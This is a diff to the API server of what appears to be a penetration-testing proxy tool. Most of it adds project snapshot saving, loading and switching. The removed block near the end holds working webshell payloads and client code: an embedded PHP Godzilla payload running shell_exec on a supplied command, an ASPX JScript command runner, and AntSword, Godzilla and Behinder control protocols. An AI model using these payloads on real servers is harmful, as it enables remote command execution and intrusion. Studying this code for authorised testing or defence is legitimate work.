+  /** WebShell 客户端（协议执行层：请求/命令/存活/文件操作，独立模块可单测）；构造器内初始化（依赖 engine） */
+  private wsClient: WebShellClient
+  /** WebShell 变更持久化：合并异步保存到项目快照（不阻塞 HTTP 路径） */
   private saveWebshells(): void {
-    try { mkdirSync(dirname(this.wsFile), { recursive: true }); writeFileSync(this.wsFile, JSON.stringify(this.webshells, null, 2)) } catch { /* 落盘失败不阻断 */ }
+    this.queueSessionSave()
   }
 
-  private loadVulns(): void {
+  /** 漏洞变更持久化：合并异步保存到项目快照（不阻塞 HTTP 路径） */
+  private saveVulns(): void {
+    this.queueSessionSave()
+  }
+  // ---------------- 会话持久化（类 Burp 项目文件：单文件二进制快照，v8 原生序列化 + gzip 压缩 + 魔数头；自动保存 + 启动恢复 + 项目管理） ----------------
+  /** 快照魔数 'HPBS'（HermesPentBox Snapshot）+ u32 版本号（头 8 字节，之后为 gzip(v8 序列化) 载荷） */
+  private static readonly SNAPSHOT_MAGIC = 'HPBS'
+  private static readonly SNAPSHOT_VERSION = 1
+  /** 默认项目文件（未显式打开/另存为时自动保存到此；启动时存在则自动恢复上次会话） */
+  private defaultProjectFile = join(homedir(), '.pentbox', 'project.hpbs')
+  /** 项目文件目录（项目管理列表扫描） */
+  private projectsDir = join(homedir(), '.pentbox', 'projects')
+  /** 当前项目文件路径（null = 新建未命名项目） */
+  private currentProjectPath: string | null = null
+  private lastSavedAt = 0
+  /** 自动保存间隔（Burp auto-save 语义：定时快照 + 退出时兜底保存） */
+  private static readonly SESSION_AUTOSAVE_MS = 10_000
+  /** 用户是否显式配置过上游（仅显式配置才持久化上游——未配置时重启仍默认跟随系统代理保证出网） */
+  private upstreamPersisted = false
+  private sessionTimer: ReturnType<typeof setInterval> | null = null
+  /** 运行中保存合并窗口句柄（500ms 防抖：快速连续变更只异步落盘一次） */
+  private sessionFlushTimer: ReturnType<typeof setTimeout> | null = null
+
+  /** 序列化快照 → 二进制 Buffer（魔数头 + gzip(v8 序列化)；Map/Set 原生支持） */
+  private encodeSnapshot(data: unknown): Buffer {
+    const head = Buffer.alloc(8)
+    head.write(ApiServer.SNAPSHOT_MAGIC, 0, 'ascii')
+    head.writeUInt32LE(ApiServer.SNAPSHOT_VERSION, 4)
+    return Buffer.concat([head, zlib.gzipSync(v8.serialize(data))])
+  }
+
+  /** 反序列化快照（校验魔数/版本；损坏或版本不符返回 null） */
+  private decodeSnapshot(buf: Buffer): unknown | null {
     try {
-      const { homedir } = require('node:os') as typeof import('node:os')
-      const { join } = require('node:path') as typeof import('node:path')
-      const { existsSync, readFileSync } = require('node:fs') as typeof import('node:fs')
-      this.vulnFile = join(homedir(), '.pentbox', 'vulns.json')
-      if (existsSync(this.vulnFile)) {
-        const data = JSON.parse(readFileSync(this.vulnFile, 'utf8')) as Vuln[]
-        this.vulns = Array.isArray(data) ? data : []
-        this.vulnSeq = this.vulns.reduce((m, v) => Math.max(m, v.id), 0)
+      if (!buf || buf.length < 8 || buf.toString('ascii', 0, 4) !== ApiServer.SNAPSHOT_MAGIC) return null
+      if (buf.readUInt32LE(4) !== ApiServer.SNAPSHOT_VERSION) return null
+      return v8.deserialize(zlib.gunzipSync(buf.subarray(8)))
+    } catch { return null }
+  }
+
+  /** 保存当前会话为项目快照（path 缺省 = 当前项目文件；未绑定项目时落默认项目文件并绑定） */
+  /** 构造快照数据（序列化前统一提取，三路径共用） */
+  private buildSnapshot(): Record<string, unknown> {
+    return {
+      savedAt: Date.now(),
+      seq: this.flows.reduce((m, f) => Math.max(m, f.id), 0),
+      upstream: this.upstreamPersisted ? this.engine.getUpstream() : null,
+      upstreamPersisted: this.upstreamPersisted,
+      downstream: this.engine.getDownstream(),   // 下游代理（项目级配置，随项目切换）
+      interceptEnabled: this.engine.interceptEnabled,
+      mitmEnabled: this.engine.mitmEnabled,
+      flows: this.flows,
+      flowDetails: this.flowDetails,   // Map 直接序列化（v8 原生支持）
+      wsFlows: this.wsFlows,
+      analyzeMap: new Map([...this.analyzeMap.entries()].map(([id, st]) => [id, { state: st.state, vuln: st.vuln, level: st.level, url: st.url, sensitive: st.sensitive, skipped: st.skipped, builtin: st.builtin, self: st.self, penetrate: st.penetrate, confirmed: st.confirmed, confLevel: st.confLevel }])),  // detail 与 flowDetails 冗余，不重复落盘
+      analysisDigest: this.analysisDigest,
+      advisedKeys: this.advisedKeys,         // Set 直接序列化
+      penetratedKeys: this.penetratedKeys,   // Set 直接序列化
+      vulns: this.vulns,                     // 漏洞库（项目级，随项目切换）
+      vulnSeq: this.vulnSeq,
+      webshells: this.webshells,             // WebShell 管理（项目级，随项目切换）
+      wsSeq: this.wsSeq,
+      chatSessionId: this.chatSessionId,     // 主 Agent bridge 会话续传（broker 独立进程，重启后可续传上下文）
+      analyzeSlots: this.analyzeSlots,       // 10 个子 Agent 槽会话续传
+      chatHistory: this.chatHistory,         // 主对话历史（Hermes Agent 聊天框，项目级）
+    }
+  }
+
+  /** 同步保存（退出/切换项目兜底：保证落盘后才返回）；运行中变更请用 queueSessionSave 异步合并，避免阻塞事件循环 */
+  saveSession(path?: string): void {
+    let target = path || this.currentProjectPath
+    if (!target) target = this.defaultProjectFile
+    try {
+      mkdirSync(dirname(target), { recursive: true })
+      writeFileSync(target, this.encodeSnapshot(this.buildSnapshot()))
+      if (!path) this.currentProjectPath = target
+      this.lastSavedAt = Date.now()
+      console.log(`[pentbox] 项目已保存: ${target}（${this.flows.length} 条流量）`)
+    } catch (e) { console.error('[pentbox] 项目保存失败:', String(e).slice(0, 120)) }
+  }
+
+  /** 运行中保存：500ms 合并窗口 + 异步写盘（序列化快、写盘不阻塞事件循环；快速连续变更只落盘一次） */
+  private queueSessionSave(): void {
+    if (this.sessionFlushTimer) return
+    this.sessionFlushTimer = setTimeout(() => {
+      this.sessionFlushTimer = null
+      let target = this.currentProjectPath
+      if (!target) target = this.defaultProjectFile
+      try {
+        const buf = this.encodeSnapshot(this.buildSnapshot())
+        mkdirSync(dirname(target), { recursive: true })
+        writeFile(target, buf).then(() => {
+          this.lastSavedAt = Date.now()
+        }).catch((e) => console.error('[pentbox] 项目异步保存失败:', String(e).slice(0, 120)))
+      } catch (e) { console.error('[pentbox] 项目异步保存失败:', String(e).slice(0, 120)) }
+    }, 500)
+  }
+
+  /** 显式保存（/api/session/save、另存为）：异步落盘，await 完成后返回；传 path = 另存为并切换当前项目（不阻塞事件循环，响应前确保已写入） */
+  private async saveSessionNow(path?: string): Promise<string | null> {
+    let target = path || this.currentProjectPath
+    if (!target) target = this.defaultProjectFile
+    try {
+      const buf = this.encodeSnapshot(this.buildSnapshot())
+      mkdirSync(dirname(target), { recursive: true })
+      await writeFile(target, buf)
+      this.currentProjectPath = target  // 同步 await 内绑定，无竞态
+      this.lastSavedAt = Date.now()
+      console.log(`[pentbox] 项目已保存: ${target}（${this.flows.length} 条流量）`)
+      return target
+    } catch (e) { console.error('[pentbox] 项目保存失败:', String(e).slice(0, 120)); return null }
+  }
+
+  /** 强杀进程树（Windows taskkill /T；其他平台 kill）——防 detached 子进程残留 */
+  private killProcessTree(proc: ReturnType<typeof spawn>): void {
+    try {
+      if (process.platform === 'win32') {
+        const { execSync } = require('node:child_process') as typeof import('node:child_process')
+        execSync(`taskkill /pid ${proc.pid} /T /F`, { timeout: 5000, stdio: 'ignore', windowsHide: true })
+      } else {
+        proc.kill('SIGTERM')
       }
-    } catch { this.vulns = [] }
+    } catch {
+      try { proc.kill() } catch { /* 已退出 */ }
+    }
   }
 
-  /** 下游代理持久化文件（~/.pentbox/downstream.json）：启动恢复，运行时 PUT 更新 */
-  private dsFile = ''
-  private loadDownstream(): void {
-    try {
-      const { homedir } = require('node:os') as typeof import('node:os')
-      const { join } = require('node:path') as typeof import('node:path')
-      const { existsSync, readFileSync } = require('node:fs') as typeof import('node:fs')
-      this.dsFile = join(homedir(), '.pentbox', 'downstream.json')
-      if (existsSync(this.dsFile)) {
-        const d = JSON.parse(readFileSync(this.dsFile, 'utf8')) as { host?: string; port?: number; protocol?: 'http' | 'socks5' }
-        if (d?.host && d.port && Number(d.port) > 0) {
-          this.engine.setDownstream({ host: String(d.host).trim(), port: Number(d.port), protocol: d.protocol === 'socks5' ? 'socks5' : 'http' })
+  /** 统一停止应用 spawn 的常驻进程（Agent Bridge / Hermes Gateway / Suo5；应用退出时调用，防 detached 残留导致下次启动复用坏进程） */
+  stopAllProcesses(): void {
+    if (this.bridgeProc) { this.killProcessTree(this.bridgeProc); this.bridgeProc = null; this.bridgeReady = false }
+    if (this.gatewayProc) { this.killProcessTree(this.gatewayProc); this.gatewayProc = null }
+    if (this.suo5Proc) { this.killProcessTree(this.suo5Proc.proc); this.suo5Proc = null }
+    console.log('[pentbox] 常驻子进程已全部停止')
+  }
+
+  /** 加载项目快照（path 缺省 = 默认项目文件，仅当存在时自动恢复上次会话） */
+  private loadSession(path?: string): void {
+    const file = path || this.defaultProjectFile
+    if (!existsSync(file)) return
+    const d = this.decodeSnapshot(readFileSync(file))
+    if (!d) return
+    this.applySnapshot(d)
+    this.currentProjectPath = file
+    this.graph.setProject(this.projectKeyOf())  // Neo4j 图切换到该项目域
+    console.log(`[pentbox] 项目已加载: ${file}（${this.flows.length} 条流量 / ${this.flowDetails.size} 条报文 / ${this.analyzeMap.size} 条分析状态 / ${this.analysisDigest.length} 条情报）`)
+  }
+
+  /** 应用快照到运行时状态：流量/报文/分析状态/情报/去重历史还原；进行中状态（渗透中/卡片待决策）重启即失效不恢复 */
+  private applySnapshot(d: unknown): void {
+    const s = d as Record<string, unknown>
+    const flows = Array.isArray(s.flows) ? (s.flows as FlowMeta[]).filter((f) => f && f.id) : []
+    if (flows.length > this.cap) flows.splice(0, flows.length - this.cap)
+    this.flows = flows
+    if (s.flowDetails instanceof Map) this.flowDetails = new Map(s.flowDetails as Map<number, never>)
+    if (Array.isArray(s.wsFlows)) this.wsFlows = (s.wsFlows as typeof this.wsFlows).slice(-500)
+    // 分析状态：done 原样恢复（流量表 Agent 列/站点地图状态正确）；queued/analyzing 重新入队续分析（detail 从 flowDetails 补齐，缺失则跳过）
+    if (s.analyzeMap instanceof Map) {
+      let requeued = 0
+      for (const [id, it] of s.analyzeMap as Map<number, { state: string; vuln?: boolean; level?: string; url?: string; sensitive?: unknown[]; skipped?: boolean; builtin?: boolean; self?: boolean; penetrate?: boolean; confirmed?: boolean; confLevel?: string }>) {
+        if (!it || !id) continue
+        const st: NonNullable<ReturnType<ApiServer['analyzeMap']['get']>> = { state: 'done', vuln: !!it.vuln, level: it.level, url: it.url, sensitive: it.sensitive as never, skipped: !!it.skipped, builtin: !!it.builtin, self: !!it.self, penetrate: !!it.penetrate, confirmed: !!it.confirmed, confLevel: it.confLevel }
+        if (it.state === 'queued' || it.state === 'analyzing') {
+          const detail = this.flowDetails.get(id)
+          if (detail && requeued < 50) { st.state = 'queued'; st.detail = detail; this.analyzeQueue.push(id); requeued++ }
+          else { st.state = 'done'; st.skipped = true }
+        } else {
+          st.detail = this.flowDetails.get(id)  // done 条目的 detail 补齐（详情展示/站点地图同步需要）
         }
+        this.analyzeMap.set(id, st)
       }
-    } catch { /* 无下游配置或读取失败 → 直连 */ }
+      if (requeued) console.log(`[pentbox] 项目恢复: ${requeued} 条未完成流量重新入队分析`)
+    }
+    if (Array.isArray(s.analysisDigest)) this.analysisDigest = s.analysisDigest
+    if (s.advisedKeys instanceof Set) this.advisedKeys = new Set(s.advisedKeys as Set<string>)
+    if (s.penetratedKeys instanceof Set) this.penetratedKeys = new Set(s.penetratedKeys as Set<string>)
+    // 漏洞库 / WebShell（项目级数据：随项目快照恢复；旧版独立 JSON 载入的残留被这里覆盖）
+    if (Array.isArray(s.vulns)) {
+      this.vulns = s.vulns as Vuln[]
+      this.vulnSeq = Number(s.vulnSeq) || this.vulns.reduce((m, v) => Math.max(m, v.id), 0)
+    }
+    if (Array.isArray(s.webshells)) {
+      this.webshells = s.webshells as typeof this.webshells
+      this.wsSeq = Number(s.wsSeq) || this.webshells.reduce((m, v) => Math.max(m, v.id), 0)
+    }
+    // Agent 会话续传：bridge broker 为独立进程，应用重启后恢复会话指针可续传上下文（broker 已重启则自动新建干净会话，无害）
+    if (typeof s.chatSessionId === 'string' && s.chatSessionId) this.chatSessionId = s.chatSessionId
+    if (Array.isArray(s.analyzeSlots)) {
+      const slots = s.analyzeSlots as (string | null)[]
+      for (let i = 0; i < ApiServer.MAX_PARALLEL; i++) if (typeof slots[i] === 'string' && slots[i]) this.analyzeSlots[i] = slots[i]
+    }
+    // 主对话历史（随项目恢复）
+    if (Array.isArray(s.chatHistory)) this.chatHistory = (s.chatHistory as { role: 'user' | 'ai'; text: string; ts: number }[]).slice(-ApiServer.CHAT_HISTORY_CAP)
+    // 上游：仅显式配置过才恢复（覆盖系统代理默认）
+    if (s.upstream && (s.upstream as Upstream).type) { this.engine.setUpstream(s.upstream as Upstream); this.upstreamPersisted = s.upstreamPersisted === true }
+    // 下游代理（随项目恢复；快照无下游 → 直连，防止切换项目残留旧项目配置）
+    this.engine.setDownstream((s.downstream as Downstream | null) || null)
+    if (typeof s.interceptEnabled === 'boolean') this.engine.interceptEnabled = s.interceptEnabled
+    if (typeof s.mitmEnabled === 'boolean') this.engine.mitmEnabled = s.mitmEnabled
+    this.engine.restoreSeq(Number(s.seq) || this.flows.reduce((m, f) => Math.max(m, f.id), 0))
   }
 
-  /** 监听配置持久化文件（~/.pentbox/listen.json）：{ip, api}——监听地址 + 主服务端口；代理/终端端口固定默认 */
-  private static readonly LISTEN_FILE = (() => {
-    try { return join(homedir(), '.pentbox', 'listen.json') } catch { return '' }
+  /** 打开项目（项目管理：切换项目文件）：先校验快照可读（不破坏当前状态）→ 自动保存当前项目 → 销毁离开项目的 Agent 会话 → 清空内存 → 应用快照 + 切换图项目域 */
+  openProject(path: string): void {
+    if (!path) throw new Error('path 缺失')
+    if (!existsSync(path)) throw new Error(`项目文件不存在: ${path}`)
+    const d = this.decodeSnapshot(readFileSync(path))
+    if (!d) throw new Error(`项目文件损坏或版本不符: ${path}`)
+    this.saveSession()  // 切换前自动保存当前项目（类 Burp：切换项目不丢当前工作区）
+    this.destroyAgentSessions()  // 销毁当前项目的 Agent 会话（隔离 + 释放 broker）
+    this.resetRuntimeState()
+    this.applySnapshot(d)
+    this.currentProjectPath = path
+    this.graph.setProject(this.projectKeyOf())  // Neo4j 图切换到该项目域
+    console.log(`[pentbox] 项目已打开: ${path}（图域 ${this.graph.projectKey}）`)
+  }
+
+  /** 新建项目：自动保存当前项目 → 销毁 Agent 会话 → 清空全部运行时状态 */
+  resetProject(): void {
+    this.saveSession()  // 新建前自动保存当前项目（类 Burp：不丢当前工作区）
+    this.destroyAgentSessions()
+    this.resetRuntimeState()
+    this.currentProjectPath = null
+    this.lastSavedAt = 0
+    this.graph.setProject('default')
+  }
+
+  /** 清空运行时状态（打开/新建项目用；引擎配置由快照加载覆盖） */
+  private resetRuntimeState(): void {
+    this.flows = []
+    this.flowDetails.clear()
+    this.wsFlows = []
+    this.analyzeMap.clear()
+    this.analyzeQueue = []
+    this.analysisDigest = []
+    this.advisedKeys.clear()
+    this.penetratedKeys.clear()
+    this.penetratingKeys.clear()
+    this.pendingAdviceSlots.clear()
+    this.penetrateTargets.clear()
+    this.graphApiSynced.clear()
+    this.vulns = []       // 项目级数据：随项目切换清空（打开项目后由快照恢复）
+    this.vulnSeq = 0
+    this.webshells = []
+    this.wsSeq = 0
+    this.chatSessionId = null  // Agent 会话指针随项目隔离（切换项目后新建干净会话）
+    this.analyzeSlots = new Array(ApiServer.MAX_PARALLEL).fill(null)
+    this.chatHistory = []  // 主对话历史随项目隔离（打开项目后由快照恢复）
+    this.invalidateDigestCache()
+    this.engine.restoreSeq(0)
+    this.engine.clearAllPenetrateTargets()
+    this.engine.setDownstream(null)   // 下游代理（项目级配置）：新建/切换项目时复位直连，由快照恢复
+    this.engine.setInterceptEnabled(false)
+    this.engine.mitmEnabled = true
+  }
+
+  /** 项目列表（项目管理面板：默认项目文件 + 项目目录扫描） */
+  /** 项目列表：默认项目 + 项目目录扫描（~/.pentbox/projects/）。保存到任意路径的项目由前端 localStorage 记录（保存对话框返回路径即来源） */
+  listProjects(): { name: string; path: string; size: number; mtime: number }[] {
+    const out: { name: string; path: string; size: number; mtime: number }[] = []
+    const seen = new Set<string>()
+    const push = (name: string, path: string) => {
+      if (!path || seen.has(path)) return
+      seen.add(path)
+      try {
+        if (existsSync(path)) {
+          const st = statSync(path)
+          out.push({ name, path, size: st.size, mtime: st.mtimeMs })
+        }
+      } catch { /* 文件缺失跳过 */ }
+    }
+    push('默认项目', this.defaultProjectFile)
+    try {
+      mkdirSync(this.projectsDir, { recursive: true })
+      for (const f of readdirSync(this.projectsDir)) {
+        if (!f.endsWith('.hpbs')) continue
+        push(f.replace(/\.hpbs$/, ''), join(this.projectsDir, f))
+      }
+    } catch (e) { console.warn('[pentbox] 项目目录扫描失败:', String(e).slice(0, 100)) }
+    return out
+  }
+
+  // ---------------- 项目域（Agent 会话 / Neo4j 图按项目隔离管理） ----------------
+  /** 当前项目域 key：默认项目 → 'default'（与旧数据迁移一致）；其他项目 → 项目文件名 */
+  private projectKeyOf(): string {
+    if (!this.currentProjectPath || this.currentProjectPath === this.defaultProjectFile) return 'default'
+    return basename(this.currentProjectPath).replace(/\.hpbs$/i, '') || 'default'
+  }
+  /** 会话 id 项目前缀：Agent 会话明确归属当前项目（如 pentbox-projA-<ts>） */
+  private projectSessionPrefix(): string {
+    return `pentbox-${this.projectKeyOf()}`
+  }
+  /** 销毁离开项目的 Agent 会话（切换/新建项目时）：释放 bridge broker 会话（隔离 + 防 broker 内存累积） */
+  private destroyAgentSessions(): void {
+    const sids = new Set<string>()
+    if (this.chatSessionId) sids.add(this.chatSessionId)
+    for (const s of this.analyzeSlots) if (s) sids.add(s)
+    for (const sid of sids) {
+      this.bridge.destroy(sid, 'hermespentbox').catch((e) => console.warn('[pentbox] 会话销毁失败:', String(e).slice(0, 100)))  // broker action:destroy（释放 AIAgent）
+    }
+  }
+
+  /** 监听配置持久化文件（~/.pentbox/config.bin，二进制）：监听地址/端口 + 窗口状态等启动参数。
+   * 启动参数（绑定先于 ApiServer 启动）无法进项目快照，作为全局二进制配置单独保存 */
+  private static readonly CONFIG_FILE = (() => {
+    try { return join(homedir(), '.pentbox', 'config.bin') } catch { return '' }
   })()
+  /** 读全局配置（config.bin，v8 序列化；损坏或不存在返回空对象） */
+  private static readConfig(): Record<string, unknown> {
+    try {
+      const { existsSync, readFileSync } = require('node:fs') as typeof import('node:fs')
+      if (ApiServer.CONFIG_FILE && existsSync(ApiServer.CONFIG_FILE)) {
+        const d = v8.deserialize(readFileSync(ApiServer.CONFIG_FILE))
+        return (d && typeof d === 'object' ? d : {}) as Record<string, unknown>
+      }
+    } catch { /* 无配置或损坏 → 默认 */ }
+    return {}
+  }
+  /** 写全局配置（合并补丁） */
+  private static writeConfig(patch: Record<string, unknown>): void {
+    try {
+      const { writeFileSync, mkdirSync } = require('node:fs') as typeof import('node:fs')
+      const { dirname } = require('node:path') as typeof import('node:path')
+      if (!ApiServer.CONFIG_FILE) return
+      const cfg = { ...ApiServer.readConfig(), ...patch }
+      mkdirSync(dirname(ApiServer.CONFIG_FILE), { recursive: true })
+      writeFileSync(ApiServer.CONFIG_FILE, v8.serialize(cfg))
+    } catch (e) { console.error('[pentbox] 全局配置落盘失败:', String(e).slice(0, 120)) }
+  }
   /** 监听配置（默认 0.0.0.0 + API 8877；代理 8899 / 终端 8878 固定默认，仅 IP 跟随）——供 electron/main.ts 绑定 */
   static loadListen(): { ip: string; api: number } {
     const def = { ip: '0.0.0.0', api: Number(process.env.PENTBOX_API_PORT ?? 8877) }
-    try {
-      const { existsSync, readFileSync } = require('node:fs') as typeof import('node:fs')
-      if (ApiServer.LISTEN_FILE && existsSync(ApiServer.LISTEN_FILE)) {
-        const d = JSON.parse(readFileSync(ApiServer.LISTEN_FILE, 'utf8')) as { ip?: string; api?: number }
-        return {
-          ip: d?.ip || def.ip,
-          api: d?.api && Number(d.api) > 0 ? Number(d.api) : def.api,
-        }
-      }
-    } catch { /* 无配置 → 默认 */ }
-    return def
+    const d = ApiServer.readConfig()
+    return {
+      ip: (d.ip as string) || def.ip,
+      api: d.api && Number(d.api) > 0 ? Number(d.api) : def.api,
+    }
+  }
+  /** 窗口状态（Burp 风格：记住窗口位置/大小，重启恢复）——供 electron/main.ts 使用 */
+  static loadWinBounds(): { x?: number; y?: number; width?: number; height?: number } | null {
+    const b = ApiServer.readConfig().winBounds as Record<string, number> | undefined
+    if (!b || typeof b !== 'object') return null
+    return { x: b.x, y: b.y, width: b.width, height: b.height }
+  }
+  static saveWinBounds(bounds: { x: number; y: number; width: number; height: number }): void {
+    ApiServer.writeConfig({ winBounds: bounds })
   }
   /** 可监听 IP 选项：全部接口 / 仅本机 / 各网卡 IPv4（去重） */
   private static listenOptions(): string[] {
@@ -1090,15 +1373,6 @@ export class ApiServer {
     })
   }
 
-  private saveVulns(): void {
-    try {
-      const { writeFileSync, mkdirSync } = require('node:fs') as typeof import('node:fs')
-      const { dirname } = require('node:path') as typeof import('node:path')
-      mkdirSync(dirname(this.vulnFile), { recursive: true })
-      writeFileSync(this.vulnFile, JSON.stringify(this.vulns, null, 2))
-    } catch { /* 落盘失败不阻断 */ }
-  }
-
   /** 从漏洞 uri 拆分出图用的 host / path（无 uri 或格式非法返回空串，不上图） */
   private splitVulnUri(uri: string): { host: string; path: string } {
     if (!uri) return { host: '', path: '' }
@@ -1111,310 +1385,6 @@ export class ApiServer {
   }
 
   /** 哥斯拉 PhpDynamicPayload 服务端代码（从 assets/payloads/php/payload.php 内嵌，握手时发送） */
-  private godzillaPhpPayload(): Buffer {
-    const candidates = [
-      join(process.cwd(), 'assets', 'payloads', 'php', 'payload.php'),
-      join(__dirname, '..', 'assets', 'payloads', 'php', 'payload.php'),
-    ]
-    const found = candidates.find((p) => existsSync(p))
-    if (found) return readFileSync(found)
-    // 兜底：内置精简版（仅 execCommand，不依赖 session）
-    return Buffer.from(`<?php
-function run($pms){global $parameters;$parameters=array();formatParameter($pms);echo execCommand();}
-function formatParameter($pms){global $parameters;$index=0;$key=null;while(true){$q=$pms[$index];if(ord($q)==2){$len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);$index+=4;$value=substr($pms,$index+1,$len);$index+=$len;$parameters[$key]=$value;$key=null;}else{$key.=$q;}$index++;if($index>strlen($pms)-1)break;}}
-function bytesToInteger($bytes,$position){$val=0;$val=$bytes[$position+3]&255;$val<<=8;$val|=$bytes[$position+2]&255;$val<<=8;$val|=$bytes[$position+1]&255;$val<<=8;$val|=$bytes[$position]&255;return $val;}
-function getBytes($string){$bytes=array();for($i=0;$i<strlen($string);$i++)array_push($bytes,ord($string[$i]));return $bytes;}
-function get($key){global $parameters;return isset($parameters[$key])?$parameters[$key]:null;}
-function execCommand(){@ob_start();$cmdLine=get("cmdLine");echo shell_exec($cmdLine." 2>&1");return ob_get_clean();}
-function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:root ProcessArch:amd64 canCallGzipDecode:0 canCallGzipEncode:0 systempdir:/tmp";}
-`, 'utf8')
-  }
-
-  /** 经内置代理发送 WebShell HTTP 请求（复用代理链，流量进流量面板）→ {code, body} */
-  private wsRequest(w: { url: string; type: string; headers?: string; readTimeout?: number }, method: string, url: string, body?: string | Buffer, ct?: string): Promise<{ code: number; body: Buffer }> {
-    return new Promise((resolve, reject) => {
-      let u: URL
-      try { u = new URL(url) } catch (e) { return reject(new Error(`URL 无效: ${url}`)) }
-      // 经代理引擎内部转发：流量正常记录（self 标记 → 跳过 Agent 审计），不添加任何特征头
-      const headers: Record<string, string> = { host: u.host }
-      // 自定义请求头（哥斯拉 headers 字段，\r\n 分隔）
-      if (w.headers) {
-        for (const line of w.headers.split(/\r?\n/)) {
-          const idx = line.indexOf(':')
-          if (idx > 0) { const k = line.slice(0, idx).trim(); const v = line.slice(idx + 1).trim(); if (k.toLowerCase() !== 'host' && k.toLowerCase() !== 'content-length') headers[k] = v }
-        }
-      }
-      if (ct) headers['content-type'] = ct
-      // 显式 Content-Length：原版 JSP shell 用 request.getHeader("Content-Length") 读取 body
-      if (body !== undefined && body !== null) {
-        headers['content-length'] = String(Buffer.isBuffer(body) ? body.length : Buffer.byteLength(String(body)))
-      }
-      // 会话 cookie：按 URL 保持（哥斯拉/冰蝎握手+执行需同一 PHPSESSID）
-      const cookie = this.wsCookies.get(u.href)
-      if (cookie) headers['cookie'] = cookie
-      const bufBody = body === undefined || body === null ? undefined : (Buffer.isBuffer(body) ? body : Buffer.from(body))
-      this.engine.forwardInternal(u, method, headers, bufBody)
-        .then((r) => {
-          // 保存 Set-Cookie（保持 session）
-          const sc = r.headers['set-cookie']
-          if (sc) {
-            const first = (Array.isArray(sc) ? sc[0] : sc).split(';')[0]
-            if (first) this.wsCookies.set(u.href, first)
-          }
-          resolve({ code: r.code, body: r.body })
-        })
-        .catch(reject)
-    })
-  }
-
-  /**
-   * WebShell 命令执行（完整协议）：
-   * - custom：GET ?cmd= 参数模式（基础一句话）
-   * - antsword：POST shell=<base64 PHP 代码> 执行任意 PHP
-   * - godzilla：XOR+base64（PHP）或 AES-ECB（JSP）加密协议 + session 会话
-   * - behinder：AES-128-CBC（默认）或 XOR 协议 + func|params 格式
-   */
-  private async wsExecShell(w: { id: number; type: string; script: string; url: string; password: string; key: string; cryption?: string; payload?: string; encoding?: string; headers?: string; connTimeout?: number; readTimeout?: number }, command: string): Promise<string> {
-    const u = new URL(w.url)
-    const key = w.key || '3c6e0b8a9c15224a'
-
-    // ---- 蚁剑：PHP POST shell=base64(PHP)；JSP POST ?shell=base64(payload class)；ASPX JScript eval(shell) ----
-    if (w.type === 'antsword') {
-      if (w.script === 'jsp' || w.script === 'jspx') {
-        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
-        if (!existsSync(classPath)) throw new Error('蚁剑 JSP payload 缺失: HermesCmd.class')
-        const classB64 = readFileSync(classPath).toString('base64')
-        const sep = w.url.includes('?') ? '&' : '?'
-        const r = await this.wsRequest(w, 'POST', w.url + sep + 'shell=' + encodeURIComponent(classB64) + '&cmd=' + encodeURIComponent(command), '', 'application/x-www-form-urlencoded')
-        return r.body.toString(w.encoding || 'utf8').trim()
-      }
-      if (w.script === 'aspx' || w.script === 'asp') {
-        // 蚁剑 ASPX JScript：POST shell=<JScript 代码>，eval(shell, unsafe) 执行任意 JScript
-        const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
-        const jsCode = `var cmd=System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("${cmdB64}"));try{var psi=new System.Diagnostics.ProcessStartInfo("/bin/sh","-c "+cmd);psi.UseShellExecute=false;psi.RedirectStandardOutput=true;psi.RedirectStandardError=true;var p=System.Diagnostics.Process.Start(psi);Response.Write(p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());}catch(e){Response.Write("ERR:"+e.message);}`
-        const r = await this.wsRequest(w, 'POST', w.url, `shell=${encodeURIComponent(jsCode)}`, 'application/x-www-form-urlencoded')
-        return r.body.toString(w.encoding || 'utf8').trim()
-      }
-      const phpCode = `echo shell_exec(${JSON.stringify(command)} . ' 2>&1');`
-      const enc = antSwordPhpEncode(phpCode)
-      const sep = w.url.includes('?') ? '&' : '?'
-      const r = await this.wsRequest(w, 'POST', w.url + sep + 'id=1', `shell=${encodeURIComponent(enc)}`, 'application/x-www-form-urlencoded')
-      return r.body.toString(w.encoding || 'utf8').trim()
-    }
-
-    // ---- custom：GET ?pwd=<密码>&cmd= 参数模式（生成的 shell 带 pwd 认证） ----
-    if (w.type === 'custom') {
-      u.searchParams.set('pwd', w.password || 'pass')
-      u.searchParams.set('cmd', command)
-      const r = await this.wsRequest(w, 'GET', u.href)
-      return r.body.toString(w.encoding || 'utf8').trim()
-    }
-
-    // ---- 哥斯拉：XOR（PHP）/ AES-ECB（JSP/ASPX） ----
-    if (w.type === 'godzilla') {
-      const pass = w.password || 'pass'
-      if (w.script === 'php') {
-        // 原版 phpXor 协议：body = XOR(payload) 原始字节（shell 用 php://input 读取后 XOR），响应 = XOR(run 输出)（gzip）
-        // 与原版一致：连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 $key 也是 md5 前16），密码不嵌入 shell
-        const connKey = crypto.createHash('md5').update(w.key || '3c6e0b8a9c15224a', 'utf8').digest('hex').slice(0, 16)
-        // 1) 握手 POST payload.php 建立 session
-        const payload = this.godzillaPhpPayload()
-        const encHand = godzillaPhpEncodeRaw(payload, connKey)
-        await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
-        // 2) 执行命令：序列化参数（methodName=execCommand + cmdLine）
-        const params = godzillaSerializeParams({ methodName: 'execCommand', cmdLine: command })
-        const enc2 = godzillaPhpEncodeRaw(params, connKey)
-        const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
-        let raw = xorCrypt(r2.body, connKey)
-        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
-          try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
-        }
-        return raw.toString(w.encoding || 'utf8').trim()
-      }
-      // 哥斯拉 JSP：AES-ECB。cryption 含 raw → 原版协议（body=原始字节，Content-Length 读取）；否则 base64 协议（pass=base64(AES)，响应 md5+base64）
-      // 连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 xc 也是 md5 前16）
-      const connKey2 = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
-      const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
